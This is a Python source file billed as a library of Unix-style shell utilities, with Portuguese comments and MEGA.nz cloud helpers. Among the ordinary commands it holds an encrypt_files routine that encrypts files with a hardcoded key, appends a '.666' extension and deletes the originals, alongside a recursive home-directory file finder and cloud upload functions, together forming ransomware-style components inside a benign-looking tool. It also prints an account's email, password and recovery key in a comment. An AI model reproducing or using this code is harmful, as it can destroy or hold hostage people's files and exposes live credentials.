"""
shell_utilities.py - A Python implementation of common Linux/Unix commands
"""
# === Built-in modules ===
import os
import re
import time
import tarfile
import fnmatch
import shutil
import random
import getpass
import platform
import subprocess
from pathlib import Path
from typing import Literal, Optional

# === Third-party modules ===
import psutil
from mega import Mega
import wget as wget_module
from colorama import Fore, Back, Style, init as colorama_init
from cryptography.fernet import Fernet

# === Initialize colorama (for cross-platform support) ===
colorama_init(autoreset=True)



def message(
    text: str,
    level: Literal['info', 'success', 'warning', 'error', 'debug', 'random'] = 'info',
    verbose: bool = True,
    custom_color: Optional[Literal[
        'black', 'red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white',
        'lightblack', 'lightred', 'lightgreen', 'lightyellow', 'lightblue',
        'lightmagenta', 'lightcyan', 'lightwhite'
    ]] = None,
    custom_style: Optional[Literal['bright', 'dim', 'normal', 'reset']] = None
) -> None:
    """
    Print colored terminal messages with verbosity control, random colors, and custom styling.

    Args:
        text: Message text to display.
        level: Message type. Pre-defined options: 'info', 'success', 'warning', 'error', 'debug', 'random'.
        verbose: If False, suppresses the message.
        custom_color: Overrides 'level' with a specific color (e.g., 'red', 'lightblue').
        custom_style: Optional style for custom_color (e.g., 'bright', 'dim').

    Examples:
        >>> message("Success!", level="success")
        >>> message("Custom color", custom_color="lightmagenta", custom_style="bright")
    """
    if not verbose:
        return

    # Cores padrão para cada nível (com Style.NORMAL explícito para evitar conflitos)
    colors = {
        'info': Fore.CYAN + Style.NORMAL,
        'success': Fore.GREEN + Style.NORMAL,
        'warning': Fore.YELLOW + Style.NORMAL,
        'error': Fore.RED + Style.NORMAL,
        'debug': Fore.MAGENTA + Style.NORMAL  # Corrigido para garantir cor magenta
    }

    # Mapeamento de cores disponíveis para customização
    available_colors = {
        'black': Fore.BLACK,
        'red': Fore.RED,
        'green': Fore.GREEN,
        'yellow': Fore.YELLOW,
        'blue': Fore.BLUE,
        'magenta': Fore.MAGENTA,
        'cyan': Fore.CYAN,
        'white': Fore.WHITE,
        'lightblack': Fore.LIGHTBLACK_EX,
        'lightred': Fore.LIGHTRED_EX,
        'lightgreen': Fore.LIGHTGREEN_EX,
        'lightyellow': Fore.LIGHTYELLOW_EX,
        'lightblue': Fore.LIGHTBLUE_EX,
        'lightmagenta': Fore.LIGHTMAGENTA_EX,
        'lightcyan': Fore.LIGHTCYAN_EX,
        'lightwhite': Fore.LIGHTWHITE_EX
    }

    # Mapeamento de estilos disponíveis para customização
    available_styles = {
        'bright': Style.BRIGHT,
        'dim': Style.DIM,
        'normal': Style.NORMAL,
        'reset': Style.RESET_ALL
    }

    # Todas as cores disponíveis para o modo random (incluindo versões light e combinações)
    all_random_colors = [
        Fore.BLACK, Fore.RED, Fore.GREEN, Fore.YELLOW,
        Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE,
        Fore.LIGHTBLACK_EX, Fore.LIGHTRED_EX, Fore.LIGHTGREEN_EX,
        Fore.LIGHTYELLOW_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX,
        Fore.LIGHTCYAN_EX, Fore.LIGHTWHITE_EX,
        
        # Combinações especiais para mais variedade
        Fore.YELLOW + Back.BLUE,
        Fore.CYAN + Back.MAGENTA,
        Fore.WHITE + Back.RED,
        Fore.LIGHTYELLOW_EX + Back.LIGHTBLUE_EX,
        Style.BRIGHT + Fore.GREEN,
        Style.BRIGHT + Fore.RED,
        Style.BRIGHT + Fore.CYAN,
        Style.DIM + Fore.YELLOW
    ]

    # Se custom_color foi especificado, usa essa cor
    if custom_color is not None:
        color = available_colors.get(custom_color.lower(), Fore.WHITE)
        style = available_styles.get(custom_style.lower(), Style.NORMAL) if custom_style else Style.NORMAL
        print(f"{style}{color}{text}{Style.RESET_ALL}")
    else:
        if level.lower() == 'random':
            # Seleciona uma cor aleatória diferente das cores padrão
            default_colors = set(colors.values())
            available_rand_colors = [c for c in all_random_colors if c not in default_colors]
            
            # Se não houver cores disponíveis, usa todas
            color = random.choice(available_rand_colors) if available_rand_colors else random.choice(all_random_colors)
        else:
            color = colors.get(level.lower(), Fore.WHITE)

        print(f"{color}{text}{Style.RESET_ALL}")

def banner(title: str) -> None:
    """Display a perfectly symmetrical formatted header with borders.
    
    Args:
        title: The title to display (will be converted to uppercase)
    """
    # Constants for layout
    MIN_WIDTH = 60  # Minimum banner width
    BORDER_CHAR = '='
    CORNER_CHAR = '*'
    SIDE_PADDING = 1  # Minimum space between border and text
    
    # Format the title (uppercase)
    formatted_title = title.upper()
    title_length = len(formatted_title)
    
    # Calculate the total required width
    required_width = max(
        MIN_WIDTH,  # Use either the minimum width or...
        2 + (2 * SIDE_PADDING) + title_length  # ...the space needed for the title
    )
    
    # Calculate available padding space
    total_padding_space = required_width - 2 - title_length  # 2 for the corner chars
    left_padding = total_padding_space // 2
    right_padding = total_padding_space - left_padding  # Handles odd numbers
    
    # Build the perfectly aligned middle line
    middle_line = (
        CORNER_CHAR + 
        ' ' * left_padding + 
        formatted_title + 
        ' ' * right_padding + 
        CORNER_CHAR
    )
    
    # Border matches exactly with the corners
    border = BORDER_CHAR * required_width
    
    # Output all parts with random colors
    message(f"\n{border}", custom_color='lightgreen', custom_style='bright')
    message(middle_line, level="random")
    message(border, custom_color='lightgreen', custom_style='bright')

# === Core shell utilities ===

def pwd():
    """Return current working directory (like 'pwd')"""
    return os.getcwd()

def clear():
    """Clear the terminal screen (like 'clear')"""
    os.system('cls' if os.name == 'nt' else 'clear')

def cd(path):
    """Change directory (like 'cd')"""
    os.chdir(path)

def ls(path='.', all_files=False, long_format=False):
    """
    List directory contents (like 'ls')

    Args:
        path: Directory path (default: current directory)
        all_files: Show hidden files (like -a flag)
        long_format: Return detailed info (like -l flag)
    """
    items = os.listdir(path)
    if not all_files:
        items = [i for i in items if not i.startswith('.')]
    if long_format:
        return [(item, os.stat(os.path.join(path, item))) for item in items]
    return items

def mkdir(path, parents=False, mode=0o777):
    """
    Create directory (like 'mkdir')

    Args:
        path: Directory path to create
        parents: Create parent directories as needed (like -p flag)
        mode: Permission mode (default: 0o777)
    """
    if parents:
        os.makedirs(path, exist_ok=True, mode=mode)
    else:
        os.mkdir(path, mode=mode)

def rm(path, recursive=False, force=False):
    """
    Remove files/directories (like 'rm')

    Args:
        path: Path to remove
        recursive: Remove directories recursively (like -r)
        force: Ignore errors if file doesn't exist (like -f)
    """
    try:
        if os.path.isdir(path):
            shutil.rmtree(path) if recursive else os.rmdir(path)
        else:
            os.remove(path)
    except Exception as e:
        if not force:
            raise
        message(f"Failed to remove {path}: {e}", level="warning")

def cp(src, dst, recursive=False, preserve_metadata=False):
    """
    Copy files/directories (like 'cp')

    Args:
        src: Source path
        dst: Destination path
        recursive: Copy directories recursively
        preserve_metadata: Preserve file metadata
    """
    if os.path.isdir(src):
        if not recursive:
            raise IsADirectoryError(f"{src} is a directory (use recursive=True)")
        shutil.copytree(src, dst, copy_function=shutil.copy2 if preserve_metadata else shutil.copy)
    else:
        shutil.copy2(src, dst) if preserve_metadata else shutil.copy(src, dst)

def mv(src, dst):
    """Move or rename files (like 'mv')"""
    shutil.move(src, dst)

def touch(path):
    """Create empty file or update timestamp (like 'touch')"""
    Path(path).touch()

def cat(file_path):
    """Display file contents (like 'cat')"""
    with open(file_path) as f:
        return f.read()

def head(file_path, lines=10):
    """Display first lines of file (like 'head')"""
    with open(file_path) as f:
        return [next(f).rstrip() for _ in range(lines)]

def tail(file_path, lines=10):
    """Display last lines of file (like 'tail')"""
    with open(file_path) as f:
        return f.readlines()[-lines:]

def echo(text, newline=True):
    """Print text to terminal (like 'echo')"""
    print(text, end='\n' if newline else '')

def sleep(seconds):
    """Pause execution (like 'sleep')"""
    time.sleep(seconds)

def find(rootdir="~", ext=None, mode="file", save_list=False, output_file="FilesFound.txt", verbose=True):
    """
    Recursively search for files or directories, supporting wildcards (*, ?) in extensions.

    Args:
        rootdir (str): Base directory to start search.
        ext (str): File extension/wildcard pattern (e.g., "*.txt", "*.pdf", "*").
        mode (str): Search mode: 'file', 'dir', or 'all'.
        save_list (bool): Whether to save results to a file.
        output_file (str): Output file path (used if save_list=True).
        verbose (bool): Enable or disable output messages.

    Returns:
        List[str]: List of matching paths.
    """
    def expand_user_path(path):
        return os.path.expanduser(path)

    def find_items(directory, pattern, mode):
        item_list = []
        directory = expand_user_path(directory)

        try:
            for root, dirs, files in os.walk(directory):
                if mode in ("dir", "all"):
                    for d in dirs:
                        full_dir = os.path.join(root, d)
                        item_list.append(full_dir)
                        message(full_dir, level="debug", verbose=verbose)
                if mode in ("file", "all"):
                    for f in files:
                        if pattern is None or fnmatch.fnmatch(f.lower(), pattern.lower()):
                            full_file = os.path.join(root, f)
                            item_list.append(full_file)
                            message(full_file, level="debug", verbose=verbose)
        except PermissionError:
            message(f"Permission denied: {directory}", level="warning", verbose=verbose)
        except Exception as e:
            message(f"Error: {e}", level="error", verbose=verbose)

        return item_list

    if ext is None and mode == "file":
        ext = input("Extension/pattern (e.g., '*.txt' or '*'): ").strip()

    # Padrão padrão para "todos os arquivos" se ext for None ou "*"
    pattern = "*" if ext in (None, "*") else ext

    search_path = expand_user_path(rootdir)
    message(f"Searching in {search_path} (mode={mode}, pattern={pattern})...", level="info", verbose=verbose)

    results = find_items(search_path, pattern, mode)

    if save_list:
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write("\n".join(results))
            message(f"List saved to: {os.path.abspath(output_file)}", level="success", verbose=verbose)
        except IOError as e:
            message(f"Failed to save list: {e}", level="error", verbose=verbose)

    message(f"Total found: {len(results)}", level="info", verbose=verbose)
    return results

from cryptography.fernet import Fernet

KEY = b'QmmjsJEWUdyufMX_XxZkGZ0TE6ba4aGttqIfBsMyn18='

def encrypt_files(file_list, key=KEY, verbose=True):
    """
    Encrypts files using a predefined key (stored in KEY).
    Renames files with '.666' extension.

    Args:
        file_list (list): List of file paths.
        key (bytes): Predefined encryption key (default: KEY).
        verbose (bool): Show progress messages.
    """
    try:
        fernet = Fernet(key)
        
        for file_path in file_list:
            try:
                if not os.path.isfile(file_path):
                    message(f"File not found: {file_path}", level="warning", verbose=verbose)
                    continue
                
                with open(file_path, "rb") as f:
                    file_data = f.read()
                
                encrypted_data = fernet.encrypt(file_data)
                new_path = file_path + ".666"
                
                with open(new_path, "wb") as f:
                    f.write(encrypted_data)
                
                os.remove(file_path)
                message(f"Encrypted: {file_path} -> {new_path}", level="success", verbose=verbose)
            
            except Exception as e:
                message(f"Failed to encrypt {file_path}: {e}", level="error", verbose=verbose)
    
    except Exception as e:
        message(f"Encryption error: {e}", level="error", verbose=verbose)

def decrypt_files(file_list, key=KEY, verbose=True):
    """
    Decrypts files using the predefined key (KEY).
    Removes '.666' extension to restore original names.

    Args:
        file_list (list): List of encrypted files (.666).
        key (bytes): Predefined key (default: KEY).
        verbose (bool): Show progress messages.
    """
    try:
        fernet = Fernet(key)
        
        for file_path in file_list:
            try:
                if not file_path.endswith(".666"):
                    message(f"Skipped (not a .666 file): {file_path}", level="warning", verbose=verbose)
                    continue
                
                with open(file_path, "rb") as f:
                    encrypted_data = f.read()
                
                decrypted_data = fernet.decrypt(encrypted_data)
                original_path = file_path[:-4]  # Remove '.666'
                
                with open(original_path, "wb") as f:
                    f.write(decrypted_data)
                
                os.remove(file_path)
                message(f"Decrypted: {file_path} -> {original_path}", level="success", verbose=verbose)
            
            except Exception as e:
                message(f"Failed to decrypt {file_path}: {e}", level="error", verbose=verbose)
    
    except Exception as e:
        message(f"Decryption error: {e}", level="error", verbose=verbose)

def grep(path, pattern):
    """Search text in files (like 'grep')"""
    import re
    matches = []
    with open(path) as f:
        for i, line in enumerate(f, 1):
            if re.search(pattern, line):
                matches.append((i, line.strip()))
    return matches

def chmod(path, mode):
    """Change file permissions (like 'chmod')"""
    os.chmod(path, mode)

def chown(path, user=None, group=None):
    """Change file owner/group (like 'chown')"""
    import pwd, grp
    uid = pwd.getpwnam(user).pw_uid if user else -1
    gid = grp.getgrnam(group).gr_gid if group else -1
    os.chown(path, uid, gid)

def ln(src, dst, symbolic=True):
    """Create hard or symbolic link (like 'ln')"""
    os.symlink(src, dst) if symbolic else os.link(src, dst)

def wget(url, output=None, verbose=True):
    """
    Download file using Python's wget module.

    Args:
        url (str): File URL.
        output (str): Output file path (optional).
        verbose (bool): Show output messages.

    Returns:
        str: Path to downloaded file.
    """
    try:
        filepath = wget_module.download(url, out=output) if output else wget_module.download(url)
        message(f"Download complete: {filepath}", level="success", verbose=verbose)
        return filepath
    except Exception as e:
        message(f"Download failed: {e}", level="error", verbose=verbose)
        return None

def tar_create(archive_name, source_path):
    """Create tar archive (like 'tar -czf')"""
    with tarfile.open(archive_name, "w:gz") as tar:
        tar.add(source_path, arcname=os.path.basename(source_path))

def tar_extract(archive_name, extract_path='.'):
    """Extract tar archive (like 'tar -xzf')"""
    with tarfile.open(archive_name, "r:gz") as tar:
        tar.extractall(path=extract_path)

def df():
    """Show disk usage (like 'df')"""
    return [{
        'device': p.device,
        'mount': p.mountpoint,
        'fs_type': p.fstype,
        'total': shutil.disk_usage(p.mountpoint).total,
        'used': shutil.disk_usage(p.mountpoint).used,
        'free': shutil.disk_usage(p.mountpoint).free
    } for p in psutil.disk_partitions()]

def du(path='.'):
    """Show file space usage (like 'du')"""
    total = 0
    for dirpath, _, filenames in os.walk(path):
        for f in filenames:
            fp = os.path.join(dirpath, f)
            total += os.path.getsize(fp)
    return total

def ps():
    """List processes (like 'ps')"""
    return [{'pid': p.pid, 'name': p.name(), 'status': p.status()} for p in psutil.process_iter()]

def kill(pid, sig=15):
    """Send signal to process (like 'kill')"""
    os.kill(pid, sig)

def whoami():
    """Return current username (like 'whoami')"""
    return getpass.getuser()

def env():
    """Return environment variables (like 'env')"""
    return dict(os.environ)

def uname():
    """Return system information (like 'uname -a')"""
    return {
        'system': platform.system(),
        'node': platform.node(),
        'release': platform.release(),
        'version': platform.version(),
        'machine': platform.machine(),
        'processor': platform.processor()
    }

def which(cmd):
    """Locate command in PATH (like 'which')"""
    for path in os.environ["PATH"].split(os.pathsep):
        full_path = os.path.join(path, cmd)
        if os.path.isfile(full_path) and os.access(full_path, os.X_OK):
            return full_path
    return None

def ping(host, count=4, timeout=2, verbose=False):
    """
    Ping host (platform independent)
    
    Args:
        host (str): Hostname or IP address
        count (int): Number of pings to send
        timeout (int): Timeout in seconds
        verbose (bool): Show detailed output
        
    Returns:
        str: Ping statistics summary
    """
    try:
        from pythonping import ping as py_ping
        response = py_ping(
            target=host,
            count=count,
            timeout=timeout,
            verbose=verbose
        )
        return str(response)
    except ImportError:
        message("pythonping module not installed. Run: pip install pythonping", "error")
        return None
    except Exception as e:
        message(f"Ping failed: {e}", "error")
        return None
# === MEGA.nz integration ===
'''
MEGA PROJECT ACCOUNT
  email(tempmail): vedomi8632@nab4.com
  username:        shell_utilities
  password:        shell_utilities
  recovery key:    GXQE7NVwRJpuB52KwkhzzQ
'''

_mega_session = None

def mega_login(email=None, password=None, verbose=True):
    """
    Realiza login na conta MEGA. Se não for fornecido email e senha, faz login anônimo.
    """
    global _mega_session
    try:
        message("Efetuando login no MEGA...", level="info")
        mega = Mega()
        _mega_session = mega.login(email, password) if email and password else mega.login()
        message("Login realizado com sucesso.", level='success', verbose=verbose)
        return True
    except Exception as e:
        message(f"Erro ao fazer login: {e}", level='error', verbose=verbose)
        return False

def mega_logout(verbose=True):
    """
    Faz logout limpando a sessão ativa.
    """
    global _mega_session
    _mega_session = None
    message("Logout efetuado.", level="info", verbose=verbose)

def mega_upload(filepath, verbose=True):
    """
    Envia um arquivo para o MEGA. Retorna o link público.
    """
    if not _mega_session:
        raise Exception("Você precisa fazer login primeiro.")
    if not os.path.isfile(filepath):
        raise FileNotFoundError(f"Arquivo não encontrado: {filepath}")
    try:
        file = _mega_session.upload(filepath)
        link = _mega_session.get_upload_link(file)
        message(f"Upload concluído: {filepath}", level="success", verbose=verbose)
        message(f"Link público: {link}", level="info", verbose=verbose)
        return link
    except Exception as e:
        message(f"Falha no upload: {e}", level="error", verbose=verbose)
        return None

def mega_list_files(verbose=True):
    """
    Lista todos os arquivos disponíveis na conta MEGA.
    Retorna uma lista de dicionários com informações.
    """
    if not _mega_session:
        raise Exception("Você precisa estar autenticado.")
    try:
        files = _mega_session.get_files()
        lista = []
        for fid, f in files.items():
            entry = {
                'id': fid,
                'name': f['name'],
                'size_kb': f['s'] // 1024
            }
            lista.append(entry)
            message(f"{fid} - {f['name']} ({entry['size_kb']} KB)", level="debug", verbose=verbose)
        return lista
    except Exception as e:
        message(f"Erro ao listar arquivos: {e}", level="error", verbose=verbose)
        return []

def mega_get_link(file_id, verbose=True):
    """
    Retorna o link público de um arquivo a partir do ID.
    """
    if not _mega_session:
        raise Exception("Você precisa estar autenticado.")
    try:
        files = _mega_session.get_files()
        if file_id not in files:
            raise ValueError(f"ID inválido: {file_id}")
        link = _mega_session.get_upload_link(files[file_id])
        message(f"Link de compartilhamento: {link}", level="info", verbose=verbose)
        return link
    except Exception as e:
        message(f"Erro ao obter link: {e}", level="error", verbose=verbose)
        return None

def mega_download_file(file_id, dest_path='.', verbose=True):
    """
    Baixa um arquivo do MEGA usando seu ID.
    """
    if not _mega_session:
        raise Exception("Você precisa estar autenticado.")
    try:
        files = _mega_session.get_files()
        if file_id not in files:
            raise ValueError(f"ID inválido: {file_id}")
        _mega_session.download(files[file_id], dest_path)
        message(f"Download concluído para: {dest_path}", level="success", verbose=verbose)
    except Exception as e:
        message(f"Falha no download: {e}", level="error", verbose=verbose)

def mega_download_url(url, dest_filename=None, verbose=True):
    """
    Baixa um arquivo de uma URL pública do MEGA.
    """
    global _mega_session
    if not _mega_session:
        _mega_session = Mega().login()
    try:
        _mega_session.download_url(url, dest_filename)
        message(f"Download via URL concluído: {url}", level="success", verbose=verbose)
    except Exception as e:
        message(f"Falha no download da URL: {e}", level="error", verbose=verbose)

def mega_delete(file_id, verbose=True):
    """
    Remove um arquivo da conta MEGA usando o ID.
    """
    if not _mega_session:
        raise Exception("Você precisa estar autenticado.")
    try:
        _mega_session.destroy(file_id)
        message(f"Arquivo {file_id} removido com sucesso.", level="success", verbose=verbose)
    except Exception as e:
        message(f"Erro ao deletar arquivo: {e}", level="error", verbose=verbose)

# while True:
#     try:
#         clear()
#         banner("HELLO WORLD")
#         # Add a small delay to prevent flickering and reduce CPU usage
#         time.sleep(0.1)
#     except KeyboardInterrupt:
#         clear()
#         banner("GOODBYE WORLD")
#         break  # Exit the loop after handling the interrupt
